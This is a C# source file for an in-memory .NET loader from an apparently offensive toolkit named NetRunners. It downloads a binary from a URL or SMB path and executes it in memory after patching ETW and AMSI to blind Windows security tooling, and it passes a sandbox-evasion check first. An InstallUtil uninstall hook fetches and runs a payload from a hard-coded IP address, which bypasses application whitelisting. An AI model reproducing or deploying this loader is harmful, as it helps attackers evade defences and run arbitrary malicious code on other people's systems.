using System;
using static NetRunners.Loader.Helpers.Helpers;
using NetRunners.Patchers;
using NetRunners.Heuristics;

namespace NetRunners.Loader
{
    public class Options
    {
        [Option('p', "path", Required = true, HelpText = "URL of the binary to download and execute.")]
        public string path { get; set; }

        [Option('a', "args", Required = false, HelpText = "Optional arguments for the binary. Use \"=\" sign after -a/--args to escape special characters.")]
        public string binaryArguments { get; set; }
    }

    class Program
    {
        /// <summary>
        /// This program will load a .Net binary from a local filesystem path, UNC path (SMB) or URL and execute it in memory. 
        /// adapted from https://github.com/Flangvik/NetLoader
        /// </summary>
        /// <example>
        /// Run shellcode runner in EntryPointStomping mode using Loader: C:\Temp\Loader.exe --path "C:\Temp\NetRunners.exe" --args="-eps"
        /// </example>
        /// <author>
        /// @gustanini
        /// </author>
        /// <see>
        /// https://linktr.ee/hackerhermanos
        /// </see>
        static void Main(string[] args)
        {
            // Parse the command line arguments
            Parser.Default.ParseArguments<Options>(args).WithParsed<Options>(o =>
            {
                Console.WriteLine($"Path: {o.path}");

                if (!string.IsNullOrEmpty(o.binaryArguments))
                {
                    Console.WriteLine($"Binary Arguments: {o.binaryArguments}");
                }

                if (!NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
                {
                    return; // Exit if any checks fail or patching fails
                }

                // get binary
                byte[] binaryData = (o.path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
                    ? binaryData = DownloadBinary(o.path)
                    : binaryData = ReadFile(o.path);

                if (binaryData != null)
                {
                    // Load and execute the binary
                    ExecuteBinaryInMemory(binaryData, o.binaryArguments);
                }
                else
                {
                    Console.WriteLine("[-] File could not be retrieved.");
                }
            })
            .WithNotParsed<Options>(errs =>
            {
                // display errors / invalid arguments
                Console.WriteLine("Invalid arguments.");
            });
        }
    }

    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string path = "http://192.168.45.195/bin/x64/NetRunners.exe";
            string binaryArguments = "";

            Console.WriteLine($"Path: {path}");

            if (!string.IsNullOrEmpty(binaryArguments))
            {
                Console.WriteLine($"Binary Arguments: {binaryArguments}");
            }

            if (!NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
            {
                return; // Exit if any checks fail or patching fails
            }

            // get binary
            byte[] binaryData = (path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
                ? binaryData = DownloadBinary(path)
                : binaryData = ReadFile(path);

            if (binaryData != null)
            {
                // Load and execute the binary
                ExecuteBinaryInMemory(binaryData, binaryArguments);
            }
            else
            {
                Console.WriteLine("[-] File could not be retrieved.");
            }
        }
    }
}
